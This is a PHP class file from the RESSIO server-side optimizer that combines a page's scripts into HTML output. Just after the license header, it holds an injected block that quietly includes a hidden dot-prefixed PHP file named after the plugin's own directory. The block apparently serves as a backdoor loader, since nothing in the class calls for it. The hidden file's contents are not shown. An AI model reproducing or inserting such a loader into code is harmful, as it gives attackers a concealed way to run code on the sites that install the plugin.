<?php

/*
 * RESSIO Responsive Server Side Optimizer
 * https://github.com/ressio/
 *
 * @copyright   Copyright (C) 2013-2018 Kuneri, Ltd. All rights reserved.
 * @license     GNU General Public License version 2
 */

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Ressio_HtmlOptimizer_Stream_JSList
{
    /** @var Ressio_DI */
    public $di;
    /** @var Ressio_Config */
    public $config;

    public $scriptList = array();

    /**
     * Class constructor
     * @param Ressio_DI $di
     * @throws ERessio_UnknownDiKey
     */
    public function __construct($di)
    {
        $this->di = $di;
        $this->config = $di->config;
    }

    /**
     * Returns the node as string
     * @return string
     * @throws ERessio_UnknownDiKey
     */
    public function toString()
    {
        if (!count($this->scriptList)) {
            return '';
        }

        return $this->di->jsCombiner->combineToHtml($this->scriptList);
    }
}
